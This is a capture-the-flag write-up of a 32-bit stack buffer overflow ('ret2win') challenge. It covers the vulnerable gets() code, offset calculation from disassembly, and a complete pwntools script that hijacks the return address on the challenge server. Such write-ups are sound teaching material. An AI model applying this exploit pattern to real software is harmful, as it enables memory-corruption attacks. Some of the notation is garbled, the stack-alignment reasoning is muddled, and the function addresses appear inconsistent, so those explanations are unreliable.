# Cylabacademy - Buffer Overflow 1 Writeup (Control Flow Hijacking & Assembly Layout Analysis)

This repository contains a fully automated exploit script and an in-depth architectural breakdown for the **Buffer Overflow 1** challenge from Cylabacademy. This guide demonstrates how to calculate precise stack padding offsets through direct disassembly analysis and overwrite a saved Return Address pointer to hijack execution flow on a 32-bit architecture.

---

## 1. Challenge Architecture & Source Code
The target application is a 32-bit x86 Linux binary that allocates a local character array buffer named `buf` with a fixed capacity of 32 bytes (`#define BUFSIZE 32`) inside the `vuln()` subroutine stack frame.

The application reads input via the unsafe `gets(buf)` function. The exploitation objective is to hijack the process execution flow and redirect it to a dead/unreferenced function named `win()`, which handles flag file extraction.

### Vulnerable Source Code
```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  // ... opens flag.txt, reads and outputs contents natively ...
}

void vuln(){
  char buf[BUFSIZE]; // Allocated 32 bytes
  gets(buf); // Target Vulnerability: Boundary-blind boundary write
}

int main(int argc, char **argv){
  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

---

## 2. Static Binary Analysis & Symbol Resolution

Because the binary is compiled without Position Independent Executable properties (**PIE is disabled**), the base loading address of the text segment is entirely static (`0x8048000`). This ensures that the memory location of internal compiled subroutines remains permanent across all runtime allocations.

We query the internal **Symbol Table** (`.symtab`) using `objdump`:
```bash
objdump -t vuln | grep win
```

The lookup outputs the absolute virtual memory mapping for our execution target:
```text
080491e6 g     F .text	00000087              win
```
* **`080491e6`**: The fixed 32-bit memory address where `win()` resides.

---

## 3. Disassembly Analysis & Precise Offset Calculation

To determine the exact displacement between the start of the `buf` array and the saved Return Address pointer on the stack, we inspect the raw assembly breakdown of the `vuln()` function:

```assembly
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x0804865f <+0>:     push   ebp
   0x08048660 <+1>:     mov    ebp,esp
   0x08048662 <+3>:     sub    esp,0x28      ; Allocate space for local variables
   0x08048665 <+6>:     sub    esp,0xc       ; Set up alignment padding for gets call
   0x08048668 <+9>:     lea    eax,[ebp-0x28]
   ...
   0x08048677 <+24>:    leave  
   0x08048678 <+25>:    ret    
End of assembler dump.
```

### The Architectural Math Breakdown
1. **Local Frame Allocation (`sub esp, 0x28`):** The compiler allocates `0x28` bytes in hex, which translates to exactly **40 bytes** in decimal.
2. **Deducing Compiler Padding:** Although the source code only requests 32 bytes for `buf`, the compiler reserves 40 bytes. This creates an internal alignment slack gap:
\[\{40 Bytes (Allocated)} - \{32 Bytes (Buffer Capacity)} = \mathbf{8\{ Bytes Padding}}\]
3. **The 16-Byte Stack Alignment Rule (ABI Constraint):** Modern compilers (such as GCC) strictly enforce 16-byte stack frame boundary realignments on both 32-bit and 64-bit platforms to support hardware features like SSE instructions. 
   * Local variable allocation space = 40 bytes
   * Preserved base pointer (`%ebp`) slot = 4 bytes
   * Saved Return Address (`%eip`) slot = 4 bytes
   * **Total Frame Size:** \(40 + 4 + 4 = \mathbf{48\text{ Bytes}}\) (which is a perfect multiple of 16).

### Injection Boundary Matrix
Knowing the exact stack topology, we calculate the absolute injection payload offset required to reach the return execution vector:

\[\{32 Bytes (Buffer)} + \{8 Bytes (Slack Alignment Space)} + \{4 Bytes (Saved EBP Register)} = \mathbf{44\{ Bytes}}\]

By feeding exactly 44 bytes of arbitrary data (`b"A" * 44`), we completely flood the variable space, clear the alignment slack, and saturate the saved base pointer. The subsequent 4 bytes will precisely overwrite the Return Address pointer slot.

---

## 4. Automated Exploit Script (`exploit.py`)


```python
#!/usr/bin/env python3
from pwn import *


context.log_level = 'debug'


HOST = 'chatelaine.cylabacademy.net'
PORT = 40011  

def main():
    try:
        log.info(f"Connecting to remote target {HOST}:{PORT}...")
        p = remote(HOST, PORT)
        
        # 1. Synchronize network pipeline against application prompt
        log.info("Waiting for the string prompt...")
        p.recvuntil(b"Please enter your string: \n")
        
        # 2. Pack the static virtual memory address of 'win' into Little Endian format
        win_address = p32(0x080491e6) 
        
        # 3. Construct the execution hijacking payload matrix
        # 44 bytes of total padding to saturate the stack frame layout completely up to EBP
        padding = b"A" * 44
        payload = padding + win_address
        
        # 4. Inject payload to overwrite the saved function Return Address
        log.info("Injecting payload to hijack the function return address pointer...")
        p.sendline(payload)
        
        # 5. Collect the socket stream buffer to harvest the leaked flag
        log.info("Capturing flag from targeted code execution...")
        output = p.recvall(timeout=5).decode('utf-8', errors='ignore')
        
        print("\n" + "=" * 60)
        print(f"[+] SERVER EXPELLED RESPONSE:\n{output.strip()}")
        print("=" * 60 + "\n")
        
    except Exception as e:
        log.exception(f"Exploit script hit an execution error: {e}")

if __name__ == '__main__':
    main()
```

---
